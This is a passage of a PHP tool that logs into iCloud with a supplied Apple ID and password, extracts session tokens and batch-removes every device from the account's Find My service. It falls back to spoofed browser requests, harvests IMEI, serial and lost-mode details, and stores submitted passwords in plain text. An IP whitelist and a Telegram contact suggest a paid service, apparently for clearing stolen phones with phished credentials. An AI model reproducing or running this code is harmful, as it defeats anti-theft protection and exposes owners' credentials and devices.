            'generateFmipWebShortLivedToken' => true,
        ]);
        $fb_auth_resp = curl_session_request('POST', $fb_auth_url, $fb_auth_body, $fb_auth_headers, null, 30, $cookie_jar);
        if ($fb_auth_resp['status'] === 200) {
            $fb_data = json_decode($fb_auth_resp['body'], true);
            if (($fb_data['status'] ?? -1) === 0) {
                $fb_token = $fb_data['tokens']['mmeFmipWebShortLivedToken'] ?? '';
                if ($fb_token !== '') {
                    emit_log('success', "    ✅ fmipWebAuthenticate OK — applying token to all {$total} devices");
                    foreach ($auth_tokens as $i => $_) {
                        $auth_tokens[$i] = $fb_token;
                    }
                } else {
                    emit_log('warning', "    ❌ fmipWebAuthenticate returned empty token");
                }
            } else {
                emit_log('warning', "    ❌ fmipWebAuthenticate status: " . ($fb_data['status'] ?? 'null'));
            }
        } else {
            emit_log('warning', "    ❌ fmipWebAuthenticate HTTP {$fb_auth_resp['status']}");
        }
        $valid_auth_count = count(array_filter($auth_tokens, fn($t) => $t !== 'Invalid'));
        emit_log('removal', "  📊 Fallback auth result: {$valid_auth_count}/{$total} valid tokens");
    }

    // ── Phase 2: Batch remove (only devices with valid auth) ──
    $remove_requests = [];
    $remove_index_map = []; // maps remove batch index → content index
    foreach ($content as $i => $device) {
        if ($auth_tokens[$i] !== 'Invalid') {
            $remove_index_map[count($remove_requests)] = $i;
            $remove_requests[] = [
                'url' => $remove_url,
                'body' => json_encode(['device' => $device['id'] ?? '', 'authToken' => $auth_tokens[$i]]),
                'headers' => $hdrs,
            ];
        }
    }

    $remove_results = [];
    if (!empty($remove_requests)) {
        $valid_count = count($remove_requests);
        emit_log('removal', "  🗑️  Phase 2: Remove {$valid_count}/{$total} devices in parallel");
        $remove_results = curl_multi_post_batch($remove_requests, $cookie_jar, 8);
    }

    // ── Build device results ──
    $remove_status_map = []; // content index → statusCode
    foreach ($remove_results as $ri => $resp) {
        $ci = $remove_index_map[$ri];

        $http_code = (int)($resp['status'] ?? 0);
        $raw_body  = (string)($resp['body'] ?? '');
        $data      = json_decode($raw_body, true);

        $status_code = is_array($data) ? ($data['statusCode'] ?? null) : null;

        // FIX: a Apple responde HTTP 200 com corpo vazio ou sem "statusCode"
        // quando ACEITA a remoção. Antes o código inventava 401 aqui e o
        // aparelho saía como NOT_REMOVED ("failed") mesmo já removido.
        if ($status_code === null) {
            $accepted = ($http_code === 200)
                && empty($data['error'])
                && empty($data['errorMessage']);
            $status_code = $accepted ? 200 : 401;
        }

        $remove_status_map[$ci] = (int)$status_code;

        emit_log('debug', sprintf(
            '  ← remove #%d HTTP %d statusCode=%s body=%s',
            $ci,
            $http_code,
            $status_code,
            mb_substr(preg_replace('/\s+/', ' ', $raw_body), 0, 120)
        ));
    }

    // ── Fallback: DeviceService-style remove if batch failed for ALL devices ──
    $batch_remove_ok = count(array_filter($remove_status_map, fn($s) => $s === 200));
    $batch_remove_tried = count($remove_status_map);
    if ($batch_remove_ok === 0 && $batch_remove_tried > 0) {
        emit_log('warning', "  ⚠️  Batch remove failed for all {$batch_remove_tried} devices — fallback to DeviceService-style remove");
        $findme_host = parse_url($server, PHP_URL_HOST);
        foreach ($content as $i => $device) {
            if ($auth_tokens[$i] === 'Invalid') continue;
            $device_id = $device['id'] ?? '';
            $fb_client_id = base64_encode("client_{$fb_prs_id}_" . time());
            $fb_remove_url = "{$server}/fmipservice/client/web/remove"
                . "?clientBuildNumber=2513Project44&clientMasteringNumber=2513B20"
                . "&clientId=" . urlencode($fb_client_id)
                . "&dsid={$fb_prs_id}";
            $fb_rm_headers = [
                "Host: {$findme_host}",
                'Connection: keep-alive',
                'sec-ch-ua-platform: "macOS"',
                'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                'sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                'Content-Type: text/plain',
                'sec-ch-ua-mobile: ?0',
                'Accept: */*',
                "Origin: {$domain_orig}",
                'Sec-Fetch-Site: same-site',
                'Sec-Fetch-Mode: cors',
                'Sec-Fetch-Dest: empty',
                "Referer: {$domain_orig}",
                'Accept-Encoding: gzip, deflate, br, zstd',
                'Accept-Language: es-419,es;q=0.9',
            ];
            $fb_rm_body = json_encode([
                'serverContext' => [
                    'minCallbackIntervalInMS' => 5000,
                    'pendingRemoveGracePeriodInDays' => 30,
                    'preferredLanguage' => 'es-mx',
                    'enable2FAFamilyActions' => false,
                    'lastSessionExtensionTime' => null,
                    'callbackIntervalInMS' => 10000,
                    'enableMapStats' => true,
                    'validRegion' => true,
                    'timezone' => [
                        'currentOffset' => -25200000,
                        'previousTransition' => 1741514399999,
                        'previousOffset' => -28800000,
                        'tzCurrentName' => 'Pacific Daylight Time',
                        'tzName' => 'US/Pacific',
                    ],
                    'authToken' => null,
                    'maxCallbackIntervalInMS' => 60000,
                    'classicUser' => false,
                    'isHSA' => true,
                    'trackInfoCacheDurationInSecs' => 86400,
                    'imageBaseUrl' => 'https://statici.icloud.com',
                    'minTrackLocThresholdInMts' => 100,
                    'itemLearnMoreURL' => 'https://support.apple.com/kb/HT211331?viewlocale=es_MX',
                    'maxLocatingTime' => 90000,
                    'itemsTabEnabled' => true,
                    'sessionLifespan' => 900000,
                    'info' => $sc_info,
                    'prefsUpdateTime' => 1742972453373,
                    'widgetFor1FA' => true,
                    'useAuthWidget' => true,
                    'clientId' => $fb_client_id,
                    'inaccuracyRadiusThreshold' => 200,
                    'enable2FAFamilyRemove' => false,
                    'serverTimestamp' => 1745886956814,
                    'deviceImageVersion' => '33',
                    'macCount' => 0,
                    'deviceLoadStatus' => '200',
                    'maxDeviceLoadTime' => 60000,
                    'prsId' => (int)$fb_prs_id,
                    'showSllNow' => false,
                    'cloudUser' => true,
                    'enable2FAErase' => false,
                    'id' => 'server_ctx',
                ],
                'clientContext' => [
                    'appName' => 'iCloud Find (Web)',
                    'appVersion' => '2.0',
                    'apiVersion' => '3.0',
                    'deviceListVersion' => 1,
                    'fmly' => true,
                    'timezone' => 'US/Pacific',
                    'inactiveTime' => 8011,
                ],
                'device' => $device_id,
                'authToken' => $auth_tokens[$i],
                'webTokenV2' => true,
            ]);
            $fb_rm_resp = curl_session_request('POST', $fb_remove_url, $fb_rm_body, $fb_rm_headers, null, 30, $cookie_jar);
            if ($fb_rm_resp['status'] === 200) {
                $fb_rm_data = json_decode($fb_rm_resp['body'], true);
                $sc = (string)($fb_rm_data['statusCode'] ?? '');
                if ($sc === '200') {
                    $remove_status_map[$i] = 200;
                    emit_log('success', "    ✅ Fallback remove #{$i} OK (statusCode 200)");
                } else {
                    emit_log('warning', "    ❌ Fallback remove #{$i} statusCode: {$sc}");
                }
            } else {
                emit_log('warning', "    ❌ Fallback remove #{$i} HTTP {$fb_rm_resp['status']}");
            }
        }
    }

    foreach ($content as $idx => $device) {
        $name = $device['name'] ?? 'Unknown';
        $model = $device['deviceDisplayName'] ?? 'Unknown';
        $bat_raw = $device['batteryLevel'] ?? 0;
        $battery = ($bat_raw > 0) ? round($bat_raw * 100, 2) : 0;
        $lost_enabled = $device['lostModeEnabled'] ?? false;
        $lost_dev = $device['lostDevice'] ?? [];
        $lost_message = is_array($lost_dev) ? ($lost_dev['text'] ?? '') : '';
        $lost_phone = is_array($lost_dev) ? ($lost_dev['ownerNbr'] ?? '') : '';

        $remove_attempted = array_key_exists($idx, $remove_status_map);
        $status_code = $remove_status_map[$idx] ?? 401;

        // FIX: aparelho que já está com remoção agendada na Apple
        // (pendingRemoveUntilTS) conta como REMOVIDO — ele sai da conta
        // quando conectar. Antes saía como "failed" mesmo já removido.
        $pending_ts = isset($device['pendingRemoveUntilTS']) ? (int)$device['pendingRemoveUntilTS'] : 0;
        $is_pending = ($pending_ts > 0);
        $is_removed = ($status_code === 200) || $is_pending;
        $failure_reason = null;

        if ($status_code === 200) {
            $removed_count++;
            emit_log('success', "    ✅ #{$idx} {$model} ({$name}) → REMOVED");
        } elseif ($is_pending) {
            $removed_count++;
            emit_log('success', "    ✅ #{$idx} {$model} ({$name}) → REMOVED (pending até "
                . date('Y-m-d', (int)($pending_ts / 1000)) . ')');
        } else {
            $failure_reason = $remove_attempted
                ? "remove retornou statusCode {$status_code}"
                : 'Apple não devolveu authToken na fase de autorização';
            emit_log('warning', "    ❌ #{$idx} {$model} ({$name}) → NOT_REMOVED ({$status_code}) — {$failure_reason}");
        }

        // ── Enrich with IMEI / SN / UDID from setup endpoint ──
        // Match the FMIP device against the account-devices map. If we
        // find a hit, pull the deep metadata; otherwise these fields stay
        // blank but the output keys are still present for consumers.
        $acct = match_account_device($device, $account_index);
        $imei         = $acct['imei']         ?? ($device['imei']         ?? '');
        $imei2        = $acct['imei2']        ?? ($device['imei2']        ?? '');
        $meid         = $acct['meid']         ?? ($device['meid']         ?? '');
        $serialNumber = $acct['serialNumber'] ?? ($device['serialNumber'] ?? '');
        $udid         = $acct['udid']         ?? ($device['udid']         ?? ($device['id'] ?? ''));
        // Some additional useful fields if the account endpoint provides them.
        $activationLock      = $acct['activationLock']         ?? null;
        $modelLargePhotoURL  = $acct['modelLargePhotoURL2x']   ?? ($acct['modelLargePhotoURL'] ?? '');
        $enclosureColor      = $acct['enclosureColor']         ?? '';
        $osVersion           = $acct['osVersion']              ?? '';
        $cellularPlanProvisioned = $acct['cellularPlanProvisioned'] ?? null;

        $devices[] = [
            'model' => $model, 'name' => $name,
            'device_class' => $device['deviceClass'] ?? '',
            'product_type' => $device['rawDeviceModel'] ?? ($acct['productType'] ?? ''),
            'device_model' => $device['deviceModel'] ?? '',
            'model_display_name' => $device['modelDisplayName'] ?? ($acct['modelDisplayName'] ?? ''),
            'device_color' => $device['deviceColor'] ?? $enclosureColor,
            'is_mac' => $device['isMac'] ?? false,

            // ── NEW: deep metadata from setup/web/device/getDevices ──
            'imei'                => $imei,
            'imei2'               => $imei2,
            'meid'                => $meid,
            'serial_number'       => $serialNumber,
            'udid'                => $udid,
            'os_version'          => $osVersion,
            'enclosure_color'     => $enclosureColor,
            'activation_lock'     => $activationLock,
            'cellular_provisioned'=> $cellularPlanProvisioned,
            'photo_url'           => $modelLargePhotoURL,

            'battery_level_percent' => $battery,
            'battery_status' => $device['batteryStatus'] ?? 'Unknown',
            'removal_status' => $is_removed ? 'REMOVED' : 'NOT_REMOVED',
            'was_removed'          => $is_removed,
            'removal_attempted'    => $remove_attempted,
            'status_code'          => $status_code,
            'error'                => $failure_reason,
            'pending_remove_until_date' => $pending_ts > 0
                ? date('Y-m-d H:i:s', (int)($pending_ts / 1000))
                : null,
            'lost_mode_enabled' => $lost_enabled,
            'lost_message' => $lost_message, 'lost_phone' => $lost_phone,
            'image_url' => "https://statici.icloud.com/fmipmobile/deviceImages-9.0/" . ($device['deviceClass'] ?? '') . "/" . ($device['rawDeviceModel'] ?? '') . "/online-infobox__2x.png"
        ];
    }

    // Also expose the raw account-devices payload so callers can grab
    // anything we didn't explicitly map (parental controls, family share,
    // backup status, etc.) without us having to widen the schema later.
    $removal['account_devices_raw'] = $account_devices;

    $removal['status'] = 'success';
    $removal['owner'] = $owner;
    $removal['devices'] = $devices;
    $removal['devices_count'] = count($devices);
    $removal['removed_count'] = $removed_count;
    $removal['failed_count'] = count($devices) - $removed_count;

    // Log successful removals
    $timestamp = date('Y-m-d H:i:s');
    $successfullyRemoved = array_filter($devices, fn($d) => $d['removal_status'] === 'REMOVED');
    foreach ($successfullyRemoved as $devInfo) {
        SuccessLogger::logSuccessfulRemoval($apple_id, $owner, $devInfo, $timestamp);
    }
    if (count($successfullyRemoved) > 0) {
        SuccessLogger::logRemovalSession($apple_id, $owner, array_values($successfullyRemoved), count($devices), $timestamp);
    }

    $STATS['autoremove_sent']++;
    $STATS['autoremove_success']++;
    $STATS['devices_removed'] += $removed_count;

    if (!empty($devices)) {
        emit_log('success', "  ✅ AutoRemove OK — Owner: {$owner} | Devices: " . count($devices) . " | Removed: {$removed_count}");
        foreach ($devices as $i => $dev) {
            $icon = ($dev['removal_status'] === 'REMOVED') ? '✅' : '❌';
            $lost = $dev['lost_mode_enabled'] ? ' ⚠️LOST' : '';
            $bat = $dev['battery_level_percent'] > 0 ? " 🔋" . round($dev['battery_level_percent']) . "%" : '';
            $n = $i + 1;
            emit_log('removal', "    {$icon} #{$n} {$dev['model']} ({$dev['name']}){$lost}{$bat} → {$dev['removal_status']}");
        }
    }
    else {
        emit_log('info', "  ℹ No devices found for {$apple_id}");
    }

    @unlink($cookie_jar);
    return $removal;
}


// ============================================================================
// SINGLE ACCOUNT AUTH (direct mode — no server needed)
// ============================================================================
function run_single_auth(string $apple_id, string $password, array $cfg): void
{
    global $STATS;

    echo "\n";
    emit_log('system', '╔══════════════════════════════════════════════════╗');
    emit_log('system', '║   iCloud Token Extractor — PHP Port v1.0        ║');
    emit_log('system', '╚══════════════════════════════════════════════════╝');
    echo "\n";

    // Check extensions
    if (!extension_loaded('gmp') && !function_exists('gmp_init')) {
        emit_log('error', '❌ Ni la extensión GMP ni BCMATH están disponibles en PHP.');
        exit(1);
    }
    if (!extension_loaded('curl')) {
        emit_log('error', '❌ Extension cURL no disponible.');
        exit(1);
    }
    $gmp_status = extension_loaded('gmp') ? 'OK (Native)' : 'OK (BCMath Polyfill)';
    emit_log('system', "✓ GMP: {$gmp_status} | cURL: OK | PHP: " . PHP_VERSION);
    echo "\n";

    // ── Account Info ──
    emit_log('system', '┌─────────────────────────────────────────────────┐');
    emit_log('system', "│  📧 Account:  {$apple_id}");
    emit_log('system', "│  🔑 Password: {$password}");
    emit_log('system', "│  🌐 Mode:     " . strtoupper($cfg['mode']));
    $ar_label = ($cfg['autoremove_enabled'] ?? true) ? 'ON' : 'OFF';
    emit_log('system', "│  🗑️  AutoRemove: {$ar_label}");
    emit_log('system', '└─────────────────────────────────────────────────┘');
    echo "\n";

    // ── Step 1: SRP Authentication ──
    emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    emit_log('info', '🔐 STEP 1: SRP Authentication');
    emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    $t0 = microtime(true);

    $result = authenticate($apple_id, $password, $cfg);
    $duration = round(microtime(true) - $t0, 1);

    echo "\n";
    emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
    emit_log('info', '📊 AUTHENTICATION RESULT');
    emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

    $icon = $result['success'] ? '✅' : '❌';
    $status_type = $result['success'] ? 'success' : 'error';
    emit_log($status_type, "{$icon} Status:      {$result['status']}");
    emit_log('info', "   HTTP Code:   {$result['status_code']}");
    emit_log('info', "   Duration:    {$duration}s");

    if ($result['error_message']) {
        emit_log('warning', "   Error:       {$result['error_message']}");
    }

    // ── Tokens ──
    if (!empty($result['tokens'])) {
        echo "\n";
        emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        emit_log('info', '🎫 TOKENS EXTRACTED');
        emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        foreach ($result['tokens'] as $key => $value) {
            $display = strlen($value) > 60 ? substr($value, 0, 57) . '...' : $value;
            emit_log('success', "   {$key}: {$display}");
        }
        // Full session_token on its own line
        if (!empty($result['tokens']['session_token'])) {
            echo "\n";
            emit_log('info', '🔑 FULL SESSION TOKEN:');
            emit_log('success', $result['tokens']['session_token']);
        }
    }
    else {
        echo "\n";
        emit_log('warning', '⚠️  No tokens extracted');
    }

    // ── Step 2: Auto-Remove (if token obtained) ──
    if ($result['success'] && !empty($result['tokens']['session_token']) && ($cfg['autoremove_enabled'] ?? true)) {
        echo "\n";
        emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        emit_log('info', '🗑️  STEP 2: Auto-Remove Devices');
        emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');

        $session_token = $result['tokens']['session_token'];
        $removal = autoremove_execute($apple_id, $password, $session_token, $cfg);

        echo "\n";
        emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        emit_log('info', '📊 AUTO-REMOVE RESULT');
        emit_log('info', '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
        $r_icon = ($removal['status'] === 'success') ? '✅' : '❌';
        emit_log($removal['status'] === 'success' ? 'success' : 'error', "{$r_icon} Status: {$removal['status']}");
        if ($removal['owner'])
            emit_log('info', "   Owner:    {$removal['owner']}");
        emit_log('info', "   Devices:  {$removal['devices_count']}");
        emit_log('info', "   Removed:  {$removal['removed_count']}");
        emit_log('info', "   Failed:   {$removal['failed_count']}");
        if ($removal['error'])
            emit_log('error', "   Error:    {$removal['error']}");
    }

    // ── Final Summary ──
    echo "\n";
    emit_log('system', '╔══════════════════════════════════════════════════╗');
    emit_log('system', '║                  DONE                            ║');
    emit_log('system', '╚══════════════════════════════════════════════════╝');
    echo "\n";
}

// ============================================================================
// IP WHITELIST & ACCESS CONTROL
// ============================================================================
define('TRAFFIC_FILE', __DIR__ . '/traffic.json');
define('REQUEST_LOG_FILE', __DIR__ . '/request_log.txt');
define('REQUESTS_PHP_FILE', __DIR__ . '/requests_php.json');

function logRequestResponse(array $request, array $response): void
{
    $records = file_exists(REQUESTS_PHP_FILE)
        ? json_decode(file_get_contents(REQUESTS_PHP_FILE), true) ?? []
        : [];
    $records[] = [
        'timestamp' => date('Y-m-d H:i:s'),
        'unix_time' => time(),
        'request' => $request,
        'response' => $response,
    ];
    if (count($records) > 500) {
        $records = array_slice($records, -500);
    }
    file_put_contents(REQUESTS_PHP_FILE, json_encode($records, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES), LOCK_EX);
}

define('IP_JSON_FILE', __DIR__ . '/ip.json');

$ALLOWED_SOURCES = file_exists(IP_JSON_FILE)
    ? json_decode(file_get_contents(IP_JSON_FILE), true) ?? ['ips' => [], 'domains' => []]
    : ['ips' => [], 'domains' => []];

function getClientIP(): string
{
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = explode(',', $_SERVER[$header])[0];
            return trim($ip);
        }
    }
    return 'unknown';
}

function getRequestOrigin(): ?string
{
    return $_SERVER['HTTP_ORIGIN'] ?? $_SERVER['HTTP_REFERER'] ?? null;
}

function extractDomain(?string $url): ?string
{
    if (!$url)
        return null;
    $parsed = parse_url($url);
    return $parsed['host'] ?? null;
}

function isSourceAllowed(string $ip, ?string $domain, array $allowedSources): bool
{
    // Solo se valida IP — dominio/origen no importa, cualquier sitio puede llamar siempre que la IP esté autorizada
    return in_array($ip, $allowedSources['ips'], true);
}

function logTraffic(array $data): void
{
    $traffic = file_exists(TRAFFIC_FILE)
        ? json_decode(file_get_contents(TRAFFIC_FILE), true) ?? []
        : [];
    $traffic[] = $data;
    if (count($traffic) > 1000) {
        $traffic = array_slice($traffic, -1000);
    }
    file_put_contents(TRAFFIC_FILE, json_encode($traffic, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);

    $ip = $data['ip'] ?? '?';
    $status = $data['response_status'] ?? '?';
    $code = $data['response_code'] ?? '?';
    apple_ulog('info', 'TRAFFIC', "IP:{$ip} → {$status} (HTTP {$code})");
}

function writeRequestLog(string $message): void
{
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents(REQUEST_LOG_FILE, "[$timestamp] $message\n", FILE_APPEND);
    apple_ulog('info', 'HTTP', $message);
}

// ============================================================================
// CLASE WRAPPER 
// ============================================================================
class AppleRemovalWithoutDB
{
    private $password;
    private $cfg;

    public function __construct($password, $cfg = null)
    {
        $this->password = $password;
        $this->cfg = $cfg ?? $GLOBALS['DEFAULT_CONFIG'];
    }

    public function executeRemoval($appleID, $password)
    {
        if (empty($appleID) || empty($password)) {
            return [
                'success' => false,
                'msg' => 'Invalid username or password',
                'owner' => '',
                'devices' => [],
                'devices_count' => 0,
                'removed_count' => 0
            ];
        }

        // SRP Authentication + Auto-remove (single buffer)
        ob_start();
        $result = authenticate($appleID, $password, $this->cfg);

        if (!$result['success']) {
            ob_end_clean();
            $error = $result['status'] ?? 'unknown';
            $systemErrors = [
                'access_denied' => 'Access denied - contact administrator https://t.me/irealmServerArcane',
                'timeout' => 'Authentication server timeout - please try again',
                'connection_failed' => 'Failed to connect to authentication server',
                'no_token' => 'No session token received',
                'invalid_response' => 'Invalid server response',
                'exception' => 'Internal server error',
            ];
            $msg = $result['error_message'] ?? $systemErrors[$error] ?? 'Authentication failed';

            return [
                'success' => false,
                'msg' => $msg,
                'error_code' => $error,
                'status_code' => $result['status_code'] ?? null,
                'owner' => '',
                'devices' => [],
                'devices_count' => 0,
                'removed_count' => 0
            ];
        }

        $sessionToken = $result['tokens']['session_token'] ?? null;
        if (empty($sessionToken)) {
            ob_end_clean();
            return [
                'success' => false,
                'msg' => 'No session token received',
                'error_code' => 'no_token',
                'owner' => '',
                'devices' => [],
                'devices_count' => 0,
                'removed_count' => 0
            ];
        }

        $removal = autoremove_execute($appleID, $password, $sessionToken, $this->cfg);
        ob_end_clean();

        if ($removal['status'] !== 'success') {
            return [
                'success' => false,
                'msg' => $removal['error'] ?? 'iCloud login failed - token may be invalid',
                'owner' => '',
                'devices' => [],
                'devices_count' => 0,
                'removed_count' => 0
            ];
        }

        $devicesCount = $removal['devices_count'] ?? 0;
        $removedCount = $removal['removed_count'] ?? 0;

        return [
            'success' => true,
            'msg' => $devicesCount > 0 ? 'Process completed successfully' : 'No devices to remove',
            'owner' => $removal['owner'] ?? $appleID,
            'devices' => $removal['devices'] ?? [],
            'devices_count' => $devicesCount,
            'removed_count' => $removedCount,
            'failed_count' => $devicesCount - $removedCount
        ];
    }
}

// ============================================================================
// HTTP REQUEST HANDLER (GET/POST API mode)
// ============================================================================
function handle_http_request(array $cfg): void
{
    global $ALLOWED_SOURCES;

    // El AutoRemove (SRP + login iCloud + borrado de N dispositivos) puede tardar
    // hasta ~2 min. El servidor (cPanel .user.ini) limita a 30s, lo que mataria la
    // peticion a mitad y devolveria un 500 sin JSON. Elevamos el limite aqui.
    @set_time_limit(0);
    @ignore_user_abort(true);

    // Allow CORS
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');
    header('Content-Type: application/json; charset=utf-8');

    // Handle preflight
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(200);
        exit;
    }

    // ── Route by Option parameter 
    $option = $_REQUEST['Option'] ?? '';

    if ($option === 'get_success_stats') {
        echo json_encode(SuccessLogger::getStats(), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        return;
    }

    // Accept both params (email_address) and native params (apple_id/email)
    $apple_id = $_REQUEST['email_address'] ?? $_REQUEST['apple_id'] ?? $_REQUEST['email'] ?? '';
    $password = $_REQUEST['password'] ?? '';

    // Also check JSON body for POST
    if (empty($apple_id) && $_SERVER['REQUEST_METHOD'] === 'POST') {
        $raw = file_get_contents('php://input');
        $json_body = json_decode($raw, true);
        if ($json_body) {
            $apple_id = $json_body['email_address'] ?? $json_body['apple_id'] ?? $json_body['email'] ?? $apple_id;
            $password = $json_body['password'] ?? $password;
        }
    }

    // ── IP / Domain validation ──
    $clientIP = getClientIP();
    $origin = getRequestOrigin();
    $domain = extractDomain($origin);
    $timestamp = date('Y-m-d H:i:s');

    $trafficEntry = [
        'timestamp' => $timestamp,
        'unix_time' => time(),
        'ip' => $clientIP,
        'origin' => $origin,
        'domain' => $domain,
        'method' => $_SERVER['REQUEST_METHOD'],
        'uri' => $_SERVER['REQUEST_URI'] ?? '',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? null,
        'content_type' => $_SERVER['CONTENT_TYPE'] ?? null,
        'params' => [
            'apple_id' => $apple_id ?: '[not provided]',
            'password' => !empty($password) ? '[REDACTED]' : '[not provided]'
        ],
        'headers' => [
            'accept' => $_SERVER['HTTP_ACCEPT'] ?? null,
            'x_forwarded_for' => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? null,
            'cf_connecting_ip' => $_SERVER['HTTP_CF_CONNECTING_IP'] ?? null,
        ],
        'allowed' => false,
        'response_code' => null,
        'response_status' => null
    ];

    if (!isSourceAllowed($clientIP, $domain, $ALLOWED_SOURCES)) {
        apple_ulog_start('[blocked]', $clientIP, $cfg['mode']);
        apple_ulog('warning', 'ACCESS', "BLOCKED: Unauthorized IP {$clientIP} (domain: {$domain})");
        apple_ulog_end(false, 'blocked', 403, 0.0, null);

        $trafficEntry['response_code'] = 403;
        $trafficEntry['response_status'] = 'blocked';
        logTraffic($trafficEntry);
        writeRequestLog("BLOCKED: Unauthorized source - IP: $clientIP, Domain: $domain Contact Admin for access https://t.me/irealmServerArcane");

        http_response_code(400);
        echo json_encode([
            'success' => false,
            'msg' => 'Access denied - contact administrator',
            'error_code' => 'access_denied',
            'status_code' => 403,
            'ip' => $clientIP,
            'owner' => '',
            'devices' => [],
            'devices_count' => 0,
            'removed_count' => 0
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        return;
    }

    $trafficEntry['allowed'] = true;

    // If no valid Option for autoremove AND no apple_id, return usage error
    if (!in_array($option, ['autoremove_cloud', 'autoremove_cloud_script', ''], true)) {
        http_response_code(400);
        echo json_encode([
            'success' => false,
            'error' => 'Invalid Option parameter. Use: autoremove_cloud, autoremove_cloud_script, or get_success_stats'
        ]);
        return;
    }

    // Validate required params
    if (empty($apple_id) || empty($password)) {
        apple_ulog_start($apple_id ?: '[empty]', $clientIP, $cfg['mode']);
        apple_ulog('warning', 'PARAMS', 'Missing apple_id or password');
        apple_ulog_end(false, 'bad_request', 400, 0.0, null);

        $trafficEntry['response_code'] = 400;
        $trafficEntry['response_status'] = 'bad_request';
        logTraffic($trafficEntry);
        writeRequestLog("ERROR: Missing parameters from IP: $clientIP");

        http_response_code(400);
        echo json_encode([
            'success' => false,
            'msg' => 'Invalid username or password',
            'error_code' => 'missing_params',
            'owner' => '',
            'devices' => [],
            'devices_count' => 0,
            'removed_count' => 0
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        return;
    }

    writeRequestLog("REQUEST: $apple_id from $clientIP ($domain)");

    // ── Start unified log for this request ──
    apple_ulog_start($apple_id, $clientIP, $cfg['mode']);

    // ── Execute via AppleRemovalWithoutDB ──
    $t0 = microtime(true);
    $remover = new AppleRemovalWithoutDB($password, $cfg);
    $result = $remover->executeRemoval($apple_id, $password);
    $duration = round(microtime(true) - $t0, 1);

    // ── Log result ──
    $statusLabel = $result['success'] ? 'SUCCESS' : 'FAILED';
    writeRequestLog("{$statusLabel}: $apple_id [{$duration}s]");

    // ── End unified log ──
    $resultStatus = $result['success'] ? 'success' : ($result['error_code'] ?? 'failed');
    $resultCode = $result['status_code'] ?? ($result['success'] ? 200 : 400);
    apple_ulog_end($result['success'], $resultStatus, (int)$resultCode, $duration, null);

    // ── Traffic log ──
    $trafficEntry['response_code'] = $result['success'] ? 200 : 400;
    $trafficEntry['response_status'] = $statusLabel;
    $trafficEntry['elapsed_time'] = $duration;
    logTraffic($trafficEntry);

    logRequestResponse(
        ['apple_id' => $apple_id, 'password' => $password, 'ip' => $clientIP, 'domain' => $domain, 'method' => $_SERVER['REQUEST_METHOD']],
        $result
    );

    // HTTP code: 200 success, 400 error (matching )
    http_response_code($result['success'] ? 200 : 400);
    echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
}

// ============================================================================
// MAIN ENTRY POINT
// ============================================================================

// Detect if running via HTTP (web server) or CLI
if (defined('INCLUDED_FROM_PARSER')) {
    // ── MODO INCLUDE (vindo do autoremove.php) ──
    // Só carrega classes/funções. Sem esta guarda, o require dispara
    // handle_http_request(): faz uma remoção completa e oculta e depois o
    // autoremove.php roda outra — a segunda já encontra tudo removido/pendente
    // e responde "failed".
}
elseif (php_sapi_name() !== 'cli') {
    // ── HTTP MODE (GET/POST) ──
    handle_http_request($DEFAULT_CONFIG);
}
else {
    // ── CLI MODE ──
    if (empty($argv[1]) || empty($argv[2])) {
        echo "Usage: php apple.php <apple_id> <password>\n";
        exit(1);
    }

    $apple_id = $argv[1];
    $password = $argv[2];

    // Disable output buffering for real-time logs
    if (ob_get_level())
        ob_end_flush();
    ini_set('output_buffering', '0');
    ini_set('implicit_flush', '1');

    run_single_auth($apple_id, $password, $DEFAULT_CONFIG);
}
